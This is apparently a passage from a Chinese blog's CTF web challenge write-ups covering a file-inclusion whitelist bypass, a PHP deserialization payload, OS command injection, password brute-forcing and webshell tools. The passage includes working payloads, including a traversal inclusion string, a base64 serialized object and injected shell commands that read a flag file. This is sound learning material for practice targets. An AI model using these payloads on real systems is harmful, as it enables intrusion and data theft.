class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#x27;file&#x27;])               //--1.传入值为非空</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])      //--2.传入值为字符串</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])//--3.能够通过checkFile()函数校验</span><br><span class="line">        //URL/?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">        //因此此处的$_REQUEST[&#x27;file&#x27;]值为source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">        </span><br><span class="line">    ) &#123;</span><br><span class="line">    //此时$_REQUEST[&#x27;file&#x27;]值任为:source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">    //此时include的对象值长上面那样↗，我也很懵，没见过这种用法</span><br><span class="line">    //对于include $_REQUEST[&#x27;file&#x27;]; </span><br><span class="line">    //就当做是以source.php为当前目录，往上返回四级目录后找到ffffllllaaaagggg吧</span><br><span class="line">    //然后在当前网页中插入ffffllllaaaagggg中的数据，打印出flag</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];           </span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;                                 //--否则打印滑稽</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2、checkFile() 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">public static function checkFile(&amp;$page)</span><br><span class="line">        //&amp;:https://www.cnblogs.com/qq1069284034/p/8390739.html</span><br><span class="line">        //$page由$_REQUEST[&#x27;file&#x27;]传入,值为source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">        </span><br><span class="line">        &#123;</span><br><span class="line">            //列出白名单</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            //isset()检测变量是否已设置并且非 NULL，存在且不为 NULL则返回true</span><br><span class="line">            //is_string()检查变量的类型是否为字符串，是字符串则返回true    </span><br><span class="line">            // ！ || ！逻辑，二者皆为true则不执行if内的语句，否则checkFile()返回false</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            //判断$page是否存在于白名单</span><br><span class="line">            //此时$page==&quot;source.php?/../../../../ffffllllaaaagggg&quot;</span><br><span class="line">            //此时不存在于白名单，该if内语句不执行</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">//mb_substr():https://www.runoob.com/php/func-string-mb_substr.html</span><br><span class="line">//“.”:https://blog.csdn.net/huawuque004/article/details/83301841</span><br><span class="line">//mb_strpos():https://www.feiniaomy.com/post/388.html</span><br><span class="line">//截取$page中&#x27;?&#x27;前部分赋给$_page</span><br><span class="line">//故$_page==&quot;source.php&quot;</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            //此时$_page存在于白名单中，执行return true，我们回到审计代码中</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">//urldecode():https://www.w3cschool.cn/php/php-urldecode.html</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><br/><p>题解链接（个人感觉有帮助的题解）：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：[<a href="https://blog.csdn.net/weixin_44033675/article/details/121368078">HCTF 2018]WarmUp_1ance’s blog-CSDN博客</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：[<a href="https://www.cnblogs.com/xhds/p/12266072.html">原题复现]HCTF 2018 Warmup（文件包含） - 笑花大王 - 博客园 (cnblogs.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - 博客园 (cnblogs.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/yybzzz/article/details/104971608">https://blog.csdn.net/yybzzz/article/details/104971608</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/qq_42016346/article/details/104199710">https://blog.csdn.net/qq_42016346/article/details/104199710</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/tch3430493902/article/details/103928125">https://blog.csdn.net/tch3430493902/article/details/103928125</a></p><br/><p>相关知识：</p><p>链接：<a href="https://blog.csdn.net/doubleguy/article/details/90166275">PHP $_REQUEST_doubleguy的博客-CSDN博客_php request</a></p><p>链接：<a href="https://blog.csdn.net/gc_msc/article/details/76050232">https://blog.csdn.net/gc_msc/article/details/76050232</a></p><br/><p>收录词条：代码审计、URL编码绕过</p><br/><p>&nbsp;&nbsp;&nbsp;&amp;nPHPstorm ，XAMPP</p><p><br/><br/></p><h4 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h4><p>代码段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//GET传参，输入点（URL/?var = 传入参数）</span><br><span class="line">if (isset($_GET[&#x27;var&#x27;])) &#123; </span><br><span class="line"></span><br><span class="line">    //base64解码$var</span><br><span class="line">    $var = base64_decode($_GET[&#x27;var&#x27;]); </span><br><span class="line">    </span><br><span class="line">    //正则过滤$var</span><br><span class="line">    //正则表达式:https://www.runoob.com/regexp/regexp-example.html</span><br><span class="line">    //preg_match():https://www.runoob.com/php/php-preg_match.html</span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;, $var)) &#123; </span><br><span class="line">        //终止</span><br><span class="line">        die(&#x27;stop hacking!&#x27;); </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //反序列化$var，这是我们要进入的地方</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    //展示URL/index.php</span><br><span class="line">    highlight_file(&quot;index.php&quot;); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Demo类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123; </span><br><span class="line">    private $file = &#x27;index.php&#x27;;</span><br><span class="line">    public function __construct($file) &#123; </span><br><span class="line">        $this-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123; </span><br><span class="line">        echo @highlight_file($this-&gt;file, true); </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123; </span><br><span class="line">        if ($this-&gt;file != &#x27;index.php&#x27;) &#123; </span><br><span class="line">            //the secret is in the fl4g.php     --flag位置提示点</span><br><span class="line">            $this-&gt;file = &#x27;index.php&#x27;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_wakeup() 该方法是PHP__反序列化时执行的__第一个方法 ， unserialize()会先检查是否存在 _wakeup()方法 ， 若存在则会先调用该方法 ， 来预先准备对象需要的资源( 比如重新建立数据库连接 ， 执行其他初始化操作等等 )<br>_construct() 与其它 OOP( 面向对象 ) 语言类似 ， PHP中也存在构造方法 ，具有构造方法的类会在每次创建新对象前调用此方法 ，该方法常用于完成一些初始化工作</p><p>_destruct() 析构方法 ， 当某个对象的所有引用都被删除或者当对象被显式销毁时 ， 析构函数会被执行 .</p><br/><p><strong>解题思路：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;详见题解链接</p><br/><p>payload构造过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">据审计，应实现：new Demo(&quot;fl4g.php&quot;);    //实例化一个Demo对象</span><br><span class="line">其中经过一次base64解码，一次unserialize反序列化</span><br><span class="line">同时需绕过preg_match()函数与__wakeup()魔术方法</span><br><span class="line"></span><br><span class="line">则：按顺序依次处理 new Demo(&quot;fl4g.php&quot;);</span><br><span class="line"></span><br><span class="line">工具链接：https://c.runoob.com/compile/1/</span><br><span class="line">payload：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br><span class="line">flag：ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20220208033512717.png" alt="image-20220208033512717"></p><br/><p>题解链接：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接（荐）：<a href="https://blog.csdn.net/weixin_45254208/article/details/107316798">https://blog.csdn.net/weixin_45254208/article/details/107316798</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/qq_41617034/article/details/104573548">https://blog.csdn.net/qq_41617034/article/details/104573548</a></p><br/><p>知识积累：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;简单来说<br>&nbsp;&nbsp;&nbsp;&nbsp;序列化是把对象的状态信息转化为可存储或传输的形式过程，也就是把对象转化为字节序列 的过程称为对象的序列化 <a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>是序列化的逆向过程，把字节数组反序列化为对象，把字节序列恢复为对象的过程 成为对象的反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基本函数:</span><br><span class="line">    serialize()：用于序列化对象或数组，并返回一个字符串返回带有变量类型和值的字符串</span><br><span class="line"></span><br><span class="line">    unserialize()：将通过serialize()函数序列化后的对象或数组进行反序列化，并返回</span><br><span class="line">       原始的对象结构</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">魔术方法--不需要调用就可以执行的方法：</span><br><span class="line">__construct()，类的构造函数</span><br><span class="line"></span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><br/><br/><h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h4><p><a href="https://blog.csdn.net/qq_45521281/article/details/105907276">CTF——Thinkphp5远程命令执行漏洞利用_WHOAMIAnony的博客-CSDN博客_thinkphp漏洞利用</a></p><p><a href="https://blog.csdn.net/qq_40884727/article/details/101452478">https://blog.csdn.net/qq_40884727/article/details/101452478</a></p><br/><br/><h4 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h4><br/><br/><h4 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h4><p><img src="image-20220213204954954.png" alt="image-20220213204954954"></p><p><img src="image-20220213205011317.png" alt="image-20220213205011317"></p><br/><br/><h1 id="sql-libs-SQL注入"><a href="#sql-libs-SQL注入" class="headerlink" title="sql libs(SQL注入)"></a>sql libs(SQL注入)</h1><p>链接：<a href="https://www.cnblogs.com/swl0221/p/12275508.html">https://www.cnblogs.com/swl0221/p/12275508.html</a></p><p>链接：<a href="https://blog.csdn.net/weixin_45728976/article/details/103932264">(2条消息) SQL注入篇——sqli-labs最详细1-40闯关指南_爱国小白帽-CSDN博客_sql注入闯关</a></p><p>链接：<a href="https://blog.csdn.net/sdb5858874/article/details/80727555">https://blog.csdn.net/sdb5858874/article/details/80727555</a></p><br/><p>既然学了MySQL，那SQL自然也逃不掉：<a href="https://www.w3school.com.cn/sql/index.asp">SQL 教程 (w3school.com.cn)</a></p><br/><br/><h1 id="bugku-基础web题"><a href="#bugku-基础web题" class="headerlink" title="bugku(基础web题)"></a>bugku(基础web题)</h1><p>链接：<a href="https://ctf.bugku.com/index.html">首页 - Bugku CTF</a></p><br/><br/><p>web学不动了，拿着别人的题解，连用的什么工具都不知道，暂时不刷了，之后要学的话我准备从基础一点的bugku开始，攻防世界还是不太适合小白。转pwn了，至少有人可以教我，而且基础工具及基础操作方法我也掌握了大概。web就当是踩了一个坑就放弃了吧，没人带学得挺慢的。</p>]]></content>
    
    
    <summary type="html">进阶区(题训)</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防世界-Web</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web/</id>
    <published>2022-01-17T14:58:59.000Z</published>
    <updated>2022-04-12T15:28:06.173Z</updated>
    
    <content type="html"><![CDATA[<br/><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>右键点击查看网页源代码不可用</p><p>F12、ctrl+u、地址栏前面加上view-source查看网页源代码</p><p>view-source:URL</p><p><br/><br/></p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p>网页爬虫robots协议，地址栏后加  /robots.txt  即可查看爬虫可检测的资源数据</p><p>URL/robots.txt</p><p><br/><br/></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>常见的六种备忘文件格式 .git .svn .swp .~ .bak .bash_history</p><p>URL/index.php.bak</p><p><br/><br/></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>之前想用Brup Suite抓包，但是捣鼓了半天没弄好，只能换Wireshark来抓包</p><p>Brup Suite下载：（自己去找）</p><p>（Brup Suite帮助文档：<a href="https://t0data.gitbooks.io/burpsuite%EF%BC%89">https://t0data.gitbooks.io/burpsuite）</a></p><p>Wireshark下载&amp;安装：<a href="https://blog.csdn.net/Qi2456/article/details/95033886">https://blog.csdn.net/Qi2456/article/details/95033886</a></p><p>Wireshark使用速成：<a href="https://b23.tv/nFBRoYS">https://b23.tv/nFBRoYS</a></p><br/><p>有了以上基础，这里就直接给图了：</p><p>看IP地址选择数据包，查看到以下字段</p><p><img src="image-20220118165024826.png" alt="image-20220118165024826"></p><p>url后添加  /cookie.php  获取指定资源:</p><p><img src="image-20220118165258439.png" alt="image-20220118165258439"></p><p>返回这一界面（See the http response：查看服务器响应报文）：</p><p><img src="image-20220118165356266.png" alt="image-20220118165356266"></p><p>查看Wireshark，发现捕捉到有关/cookie.php的数据包</p><p><img src="image-20220118165603028.png" alt="image-20220118165603028"></p><p>右键点击，查看TCP流：</p><p><img src="image-20220118165724094.png" alt="image-20220118165724094"></p><p>拿到flag：</p><p><img src="image-20220118165800464.png" alt="image-20220118165800464"></p><br/><p>另外，由浏览器的自带开发工具也可以解这道题：</p><p>首先，F12打开控制台，按以下图片操作：</p><p><img src="image-20220118170132006.png" alt="image-20220118170132006"></p><p><img src="image-20220118170341396.png" alt="image-20220118170341396"></p><p>它叫我们看cookie.php，那我们就看呗，地址栏写入相应资源：</p><p><img src="image-20220118170455065.png" alt="image-20220118170455065"></p><p><img src="image-20220118170532433.png" alt="image-20220118170532433"></p><p>进入查看，找到flag：</p><p><img src="image-20220118170747113.png" alt="image-20220118170747113"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;17adcb29931a37eedfd9b45d4573af98&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p>F12,删除disabled再按按钮即可</p><p><img src="image-20220118193027278.png" alt="image-20220118193027278"></p><p><br/><br/></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p>随机输入账户、密码登录，发现提示以用户名admin登录（密码未提示）：</p><p><img src="image-20220118212332148.png" alt="image-20220118212332148"></p><br/><p>接下来利用Brup Suite，创建网页：</p><p><img src="image-20220121062058553.png" alt="image-20220121062058553"></p><p>地址栏输入题目给的IP地址（显示加载中，进Brup点forward即可显示）：</p><p><img src="image-20220121062630832.png" alt="image-20220121062630832"></p><p><img src="image-20220121062732420.png" alt="image-20220121062732420"></p><br/><p>输入用户admin（），密码123，回车：</p><p><img src="image-20220118211507617.png" alt="image-20220118211507617"></p><p>返回Brup Suite抓包，抓到如下包：</p><p><img src="image-20220118211439592.png" alt="image-20220118211439592"></p><p>点击Forward抓包，前往HTTP history查看，找到刚刚对应的包：</p><p><img src="image-20220118211840368.png" alt="image-20220118211840368"></p><p>右键Send to Intruder（实施密码爆破），前往Intruder查看：</p><p><img src="image-20220118212014731.png" alt="image-20220118212014731"></p><p>将admin 两端的 $ 符号去掉，因为用户名admin已知是正确的，不需要爆破：</p><p><img src="image-20220118213828075.png" alt="image-20220118213828075"></p><p>点进Payloads，点击Load写好以下字典txt（密码：123456，提前知道的，这里就随便写几组，重要的是熟悉用法流程），并装载至Payload Options</p><p><img src="image-20220118210913233.png" alt="image-20220118210913233"></p><p><img src="image-20220118214025101.png" alt="image-20220118214025101"></p><p>最后点击右上侧的Start attack键即可开始爆破。</p><p>一个一个地看响应（Response），发现密码为123456时得到flag</p><p><img src="image-20220118210653461.png" alt="image-20220118210653461"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;fcfc4fd91884d261c2bb7f0f115abce1&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>PHP基本语法：（自己去学）</p><p>Get传参：URL//?a=00a&amp;&amp;b=12345s</p><p><br/><br/></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>get简单的说就是直接在url后面添加参数<br>post需要在http包里面添加参数或者在Firefox的hackbar里面可以直接添加参数</p><p>GET：URL/?a=1</p><p>POST：hackbar</p><p>———↑ 废话 ——–</p><br/><p>（本来打算自己用Brup Suite通过拦截/构造请求报文做这道题的，最后还是用了hackbar插件）搜了诸多资料后，了解到GET请求方式将请求数据放在了HTTP协议头＜request-line＞中，POST请求把提交的数据放置在HTTP包的包体＜request-body＞中，然后我就去构造请求报文，尝试了半天都没弄出来，一气之下便打开火狐下载hackbar插件，借助Wireshark抓包将三组请求数据报文抓出来一一对比，看完之后本人就无语了……。</p><p>贴个链接：<a href="https://www.cnblogs.com/biyeymyhjob/archive/2012/07/28/2612910.html">HTTP请求报文和HTTP响应报文 - as_ - 博客园 (cnblogs.com)</a></p><p>再贴一个：<a href="https://www.csdn.net/tags/NtTacg2sODkwNDEtYmxvZwO0O0OO0O0O.html"> 以post方式随便提交一个名为b的变量 - CSDN</a></p><p>链接：<a href="https://blog.csdn.net/liuno0/article/details/100542194"> Burpsuite拦截并修改request/response_liuno0的博客-CSDN博客_burp如何修改response</a></p><p>hackbar下载：<a href="https://blog.csdn.net/Drifter_Galaxy/article/details/118692054">hackbar2.1.3 安装教程（附下载地址 ）Firefox &amp; Chrome_coderge的博客-CSDN博客_hackbar</a></p><br/><p>解题过程：</p><p>火狐安装hackbar插件，F12：</p><p><img src="image-20220119160004865.png" alt="image-20220119160004865"></p><p>解题完毕。</p><br/><p>拓展：</p><p>以上操作过程全程Wireshark监控（无参发送一次、GET请求一次、GET加POST请求一次），抓到以下三个包，无参请求、Get请求、POST请求：</p><p><img src="image-20220119160141262.png" alt="image-20220119160141262"></p><p>对比无参请求、Get参数请求、Post参数请求：</p><p><img src="image-20220119160215794.png" alt="image-20220119160215794"></p><p>将第三张图片的POST请求报文粘贴至Brup Suite查看效果：</p><p><img src="image-20220119160313717.png" alt="image-20220119160313717"></p><p>响应报文中出现flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;b30d28348d309b6e811d82eb7baa91d3&#125;</span><br></pre></td></tr></table></figure><p><br/><br/></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>链接：<a href="https://blog.csdn.net/qq_41617034/article/details/91802623">https://blog.csdn.net/qq_41617034/article/details/91802623</a></p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.123.123.123</span><br><span class="line">Referer:https://www.google.com</span><br></pre></td></tr></table></figure><p>注：请求报文中插入XFF后，最后一行数据需空两行才能成功</p><br/><br/><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>菜刀：<a href="https://blog.csdn.net/silence1_/article/details/89672553">https://blog.csdn.net/silence1_/article/details/89672553</a></p><p>蚁剑：<a href="https://blog.csdn.net/weixin_43545225/article/details/120255025">https://blog.csdn.net/weixin_43545225/article/details/120255025</a></p><p>蚁剑下载：<a href="https://blog.csdn.net/weixin_42474304/article/details/116376746">中国蚁剑(antSword)下载、安装、使用教程_CTF的博客-CSDN博客_中国蚁剑</a></p><p><img src="image-20220121040951156.png" alt="image-20220121040951156"></p><p><img src="image-20220121040917664.png" alt="image-20220121040917664"></p><p><img src="image-20220121041514296.png" alt="image-20220121041514296"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:cyberpeace&#123;8f03eb815046d74a3bfedc206628512c&#125;</span><br></pre></td></tr></table></figure><br/><br/><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p>链接（OS命令注入攻击）：<a href="https://blog.csdn.net/qq_38265137/article/details/101158082">https://blog.csdn.net/qq_38265137/article/details/101158082</a></p><p>链接（《图解HTTP》224页）：<a href="https://blog.csdn.net/AC_greener/article/details/80219609">https://blog.csdn.net/AC_greener/article/details/80219609</a></p><br/><p>输入框输入以下数据即可获取flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home &amp;&amp;cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="image-20220121042741986.png" alt="image-20220121042741986"></p><br/><h5 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;ls</span><br></pre></td></tr></table></figure><p>目的：连续使用多次返回上一级目录，查看根目录所包含的资源（文件、文件夹等统称）情况：</p><p><img src="image-20220121044804580.png" alt="image-20220121044804580"></p><p>查看到有home目录的存在，而Linux操作系统中（绝大部分的服务器搭载的都是Linux操作系统）用户使用的目录就默认建立在home目录下，所以我们写出以下指令查看home目录下的资源情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home  &amp;&amp;ls</span><br></pre></td></tr></table></figure><p>ok，flag文档直接就出来了：</p><p><img src="image-20220121045219051.png" alt="image-20220121045219051"></p><p>最后就是开头那样，加一个“cat flag.txt”即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;cd ../../../../../../../../../ &amp;&amp;cd ./home &amp;&amp;cat flag.txt</span><br></pre></td></tr></table></figure><br/><p>推荐题解：</p><p>链接（手动测试）：<a href="https://blog.csdn.net/zouchengzhi1021/article/details/104074871">https://blog.csdn.net/zouchengzhi1021/article/details/104074871</a></p><p>链接（python脚本）：<a href="https://blog.csdn.net/qq_29566629/article/details/107633755">https://blog.csdn.net/qq_29566629/article/details/107633755</a></p><br/><br/><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>链接（冗）：<a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p><p>链接（修改源码）：<a href="https://blog.csdn.net/qq_40481505/article/details/89929978">https://blog.csdn.net/qq_40481505/article/details/89929978</a></p><p>链接（简）：<a href="https://blog.csdn.net/qq_37872337/article/details/108100275">https://blog.csdn.net/qq_37872337/article/details/108100275</a></p><p>链接（简+明）：<a href="https://www.cnblogs.com/ainv-123/p/11595170.html">攻防世界 simple——js - ainv - 博客园 (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 